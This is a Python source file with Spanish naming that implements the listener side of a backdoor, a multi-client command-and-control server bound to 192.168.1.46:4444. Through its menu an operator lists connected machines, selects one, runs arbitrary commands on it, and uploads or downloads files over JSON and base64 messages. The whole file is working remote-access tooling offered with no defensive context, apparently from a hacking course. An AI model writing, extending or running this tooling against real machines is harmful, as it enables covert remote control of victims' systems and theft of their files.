#!/usr/bin/env python
import socket
import json
import base64
import threading


class Escuchador:
    def __init__(self, ip, puerto):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, puerto))
        self.listener.listen(5)  # Permite hasta 5 conexiones en cola
        print("[+] Esperando conexiones entrantes")
        self.clientes = []
        self.direcciones = []

    def manejar_cliente(self, conexion, direccion):
        print(f"[+] Se ha establecido una conexion desde {direccion}")
        self.clientes.append(conexion)
        self.direcciones.append(direccion)

        while True:
            try:
                datos_json = ""
                while True:
                    try:
                        datos_json += conexion.recv(1024).decode()
                        if datos_json:
                            comando = json.loads(datos_json)
                            break
                    except ValueError:
                        continue

                if comando[0] == "exit":
                    conexion.close()
                    self.clientes.remove(conexion)
                    self.direcciones.remove(direccion)
                    break

                resultado = self.ejecutar_remotamente(comando, conexion)
                self.enviar_confiablemente(resultado, conexion)
            except Exception as e:
                print(f"[-] Error manejando el cliente {direccion}: {str(e)}")
                if conexion in self.clientes:
                    self.clientes.remove(conexion)
                if direccion in self.direcciones:
                    self.direcciones.remove(direccion)
                conexion.close()
                break

    def enviar_confiablemente(self, datos, conexion):
        try:
            datos_json = json.dumps(datos)
            conexion.sendall(datos_json.encode())
        except Exception as e:
            print(f"[-] Error enviando datos al cliente: {str(e)}")
            if conexion in self.clientes:
                self.clientes.remove(conexion)
            conexion.close()

    def recibir_confiablemente(self, conexion):
        datos_json = ""
        while True:
            try:
                datos_json += conexion.recv(1024).decode()
                if datos_json:
                    return json.loads(datos_json)
            except ValueError:
                continue
            except Exception as e:
                print(f"[-] Error recibiendo datos del cliente: {str(e)}")
                if conexion in self.clientes:
                    self.clientes.remove(conexion)
                conexion.close()
                return None

    def ejecutar_remotamente(self, comando, conexion):
        self.enviar_confiablemente(comando, conexion)
        if comando[0] == "exit":
            conexion.close()
            exit()
        return self.recibir_confiablemente(conexion)

    def escribir_archivo(self, ruta, contenido):
        try:
            with open(ruta, "wb") as archivo:
                archivo.write(base64.b64decode(contenido))
                return "[+] Descarga exitosa."
        except Exception as e:
            return f"[-] Error escribiendo el archivo: {str(e)}"

    def leer_archivo(self, ruta):
        try:
            with open(ruta, "rb") as archivo:
                return base64.b64encode(archivo.read()).decode()
        except Exception as e:
            return f"[-] Error leyendo el archivo: {str(e)}"

    def mostrar_menu(self):
        print('')
        print('==========================================================')
        print("Opciones disponibles:")
        print("subir archivos:           subir [nombre_archivo]")
        print("descargar archivos:       descargar [nombre_archivo]")
        print("listar clientes:          listar")
        print("seleccionar cliente:      seleccionar [numero_cliente]")
        print("salir:                    exit")
        print('==========================================================')
        print('')

    def ejecutar(self):
        threading.Thread(target=self.aceptar_conexiones).start()
        self.mostrar_menu()

        cliente_activo = None

        while True:
            comando = input(">> ")
            comando = comando.split(" ")

            if comando[0] == "listar":
                for i, direccion in enumerate(self.direcciones):
                    print(f"[{i}] {direccion}")

            elif comando[0] == "seleccionar":
                try:
                    indice = int(comando[1])
                    if 0 <= indice < len(self.clientes):
                        cliente_activo = self.clientes[indice]
                        print(f"[+] Cliente {self.direcciones[indice]} seleccionado.")
                    else:
                        print("[-] Indice de cliente invalido.")
                except (IndexError, ValueError):
                    print("[-] Indice de cliente invalido.")

            elif comando[0] == "exit":
                if cliente_activo:
                    self.enviar_confiablemente(["exit"], cliente_activo)
                print("[+] Saliendo...")
                break

            elif cliente_activo:
                try:
                    if comando[0] == "subir":
                        contenido_archivo = self.leer_archivo(comando[1])
                        if isinstance(contenido_archivo, str) and contenido_archivo.startswith("[-]"):
                            print(contenido_archivo)
                            continue
                        comando.append(contenido_archivo)

                    resultado = self.ejecutar_remotamente(comando, cliente_activo)

                    if comando[0] == "descargar" and "[-] Error " not in resultado:
                        resultado = self.escribir_archivo(comando[1], resultado)
                except Exception as e:
                    resultado = f"[-] Error durante la ejecucion del comando: {str(e)}"

                print(resultado)
            else:
                print("[-] No hay cliente seleccionado. Use el comando 'seleccionar' para seleccionar un cliente.")

    def aceptar_conexiones(self):
        while True:
            try:
                conexion, direccion = self.listener.accept()
                cliente_hilo = threading.Thread(target=self.manejar_cliente, args=(conexion, direccion))
                cliente_hilo.start()
            except Exception as e:
                print(f"[-] Error aceptando conexiones: {str(e)}")


if __name__ == "__main__":
    try:
        mi_escuchador = Escuchador("192.168.1.46", 4444)
        mi_escuchador.ejecutar()
    except Exception as e:
        print(f"[-] Error inicializando el escuchador: {str(e)}")
